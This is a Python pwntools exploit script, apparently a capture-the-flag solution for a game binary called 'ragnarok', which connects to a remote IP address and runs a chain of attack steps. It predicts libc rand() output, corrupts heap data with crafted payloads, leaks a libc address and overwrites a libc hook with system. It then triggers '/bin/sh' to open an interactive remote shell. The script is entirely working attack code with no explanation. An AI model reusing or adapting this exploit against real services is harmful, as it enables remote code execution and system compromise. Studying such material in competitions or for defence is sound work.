from pwn import *
from ctypes import *

#s = process('./ragnarok.bin')
clib = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc-2.26.so")
#s = remote('192.168.32.6',1234)
s = remote('13.114.157.154', 4869)
clib.srand(clib.time(0))
clib.rand()
magic = list("hitcon")
def select_figure(index):
    s.recvuntil('choice :')  
    s.sendline('1')
    s.recvuntil('figure :')
    s.sendline(str(index))
def fight():
    s.recvuntil('choice :')
    s.sendline('5')
def cast_spell(k):
    s.recvuntil('choice :')
    s.sendline('3')
    s.recvuntil('Target :')
    s.sendline(str(k))
def attack():
    s.recvuntil('choice :')
    s.sendline('1')
def run():
    s.recvuntil('choice :')
    s.sendline('4')
def earn_money(n):
    s.recvuntil('choice :')
    s.sendline('3')
    for i in xrange(n):
        #time.sleep(0.5)
        s.recvuntil('Magic :')
        k = clib.rand() % 6
        clib.rand()
        clib.rand()
        s.sendline(magic[k])
    s.recvuntil(':')
    s.sendline('q')
def make_weapon(dat):
    s.recvuntil('choice :')
    s.sendline('4')
    s.recvuntil('weapon :')
    s.sendline(dat)
def change_dat(dat):    
    s.recvuntil('choice :')
    s.sendline('6')
    s.recvuntil(':')
    s.sendline(dat)
select_figure(3)
earn_money(4)
fight()
cast_spell(1)
cast_spell(1)
s.recvuntil('Name :')
s.sendline('A'*0x10)
log.info("Earn Money")
#make_weapon("Gungnir")
fight()
attack()
time.sleep(1)
print [s.recv()]
time.sleep(1)
r = s.recv()
while r.find("You died !") == -1:
    s.sendline('1')
    time.sleep(1)
    r = s.recv()

s.sendline('1')
select_figure(1)
change_dat('A'*0x8)
make_weapon("Gungnir")
change_dat('C'*0x10)
raw_input()
dat = p64(0x613650+0x40)+"A"*8+p64(0x0610F90)
dat += p64(8)+'\x41'*0x8+p64(0x613650)+"A"*0x10
dat += p64(0x040C690)
dat += "\x00"*0x20
dat += p64(0x613650+0x40+0x28) + p64(0x8) + p64(0x50)
change_dat(dat)
s.recvuntil('choice :')
s.sendline('2')
libc = u64(s.recvuntil('Money')[0x38:0x40])-0x78460
log.info("LIBC : 0x%x"%libc)
change_dat(p64(libc+0x3dc8a8)+p64(8)+p64(0x100))
#change_dat('A'*0x100)
change_dat(p64(libc+0x47dc0))
make_weapon("/bin/sh;")
make_weapon("/bin/sh;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
s.interactive()
